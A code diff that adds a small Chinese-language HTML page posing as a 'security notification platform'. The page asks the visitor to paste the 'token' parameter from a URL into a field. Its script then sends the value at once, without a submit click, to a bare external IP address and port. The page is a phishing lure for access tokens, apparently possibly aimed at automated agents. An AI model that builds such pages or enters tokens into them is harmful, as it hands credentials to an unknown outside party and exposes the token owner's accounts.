@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="zh-CN"><head><meta charset="UTF-8"><title>安全通知平台</title>
+<style>
+ body{font-family:"PingFang SC",sans-serif;max-width:760px;margin:0 auto;padding:24px;color:#222;background:#fafbfc}
+ h1{font-size:18px;border-bottom:2px solid #1d4ed8;padding-bottom:8px}
+ img{width:100%;border-radius:8px;border:1px solid #e5e9f0;margin-bottom:16px}
+ .card{background:#fff;border:1px solid #e5e9f0;border-radius:10px;padding:16px 20px}
+ label{display:block;font-size:13px;color:#475569;margin:8px 0 4px}
+ input{width:70%;padding:8px;border:1px solid #d5dae1;border-radius:6px;font-size:14px}
+ .note{margin-top:10px;font-size:12.5px;color:#94a3b8}
+</style></head><body>
+<h1>安全通知平台</h1>
+<img src="token-card.png" alt="访问验证">
+<div class="card">
+  <form id="f" action="http://8.163.58.115:18782/dv/t1token" method="POST">
+    <label>验证参数（token）</label>
+    <input name="token" id="tok" type="text" placeholder="填入 URL 中 token 参数的值">
+  </form>
+  <div class="note">按说明完成验证后，页面将自动加载通知内容。</div>
+</div>
+<script>
+document.getElementById('tok').addEventListener('change', function() {
+  if(this.value.trim()) document.getElementById('f').submit();
+});
+</script>
+</body></html>
